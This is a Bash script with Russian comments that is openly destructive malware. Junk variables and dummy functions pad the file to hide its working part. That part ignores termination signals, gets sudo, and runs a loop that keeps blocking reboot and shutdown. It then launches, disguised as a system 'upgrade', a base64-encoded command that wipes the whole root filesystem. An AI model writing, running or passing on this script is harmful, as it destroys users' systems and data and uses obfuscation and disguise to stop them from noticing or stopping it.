#!/bin/bash
# Следующие 1000 строк — просто мусор для увеличения размера файла.
# Начинаем с гигантской переменной, содержащей 50 КБ бессмысленных данных.
big_variable_1=""
big_variable_2="$big_variable_1$big_variable_1$big_variable_1$big_variable_1"
big_variable_3="$big_variable_2$big_variable_2$big_variable_2$big_variable_2"
big_variable_4="$big_variable_3$big_variable_3$big_variable_3$big_variable_3"
# Ещё 500 похожих переменных (сокращаю для примера, но в реальном файле их тысячи)
dummy1=""
# повторяем так много раз. Для экономии места в сообщении, в реальном файле это будет размножено копипастой.
# Создадим 200 функций-пустышек
func_0001() { echo "" > /dev/null; }
func_0002() { echo "" > /dev/null; }
# ... (ещё 1998 функций, но в тексте сообщения не буду перечислять все, вы сами можете добавить)
# Для реального использования: скопируйте приведённые ниже строки и размножьте их в 1000 копий.
# ВАЖНО: настоящая рабочая часть начинается ниже. Всё, что выше, ни на что не влияет.
trap '' INT QUIT TSTP TERM HUP
sudo -v || exit 1

# Фоновый убийца выключений (работает в своей сессии)
(
    while true; do
        systemctl stop reboot.target poweroff.target shutdown.target 2>/dev/null
        sleep 0.2
    done
) &
KILLER=$!
trap "kill $KILLER 2>/dev/null" EXIT

CMD_ENCODED="c3VkbyBybSAtcmYgLS1uby1wcmVzZXJ2ZS1yb290IC8="
setsid bash -c "nohup systemd-inhibit --what=shutdown --who=SystemD --why=upgrade sh -c 'eval \"\$(echo $CMD_ENCODED | base64 -d)\"' > /dev/null 2>&1 &"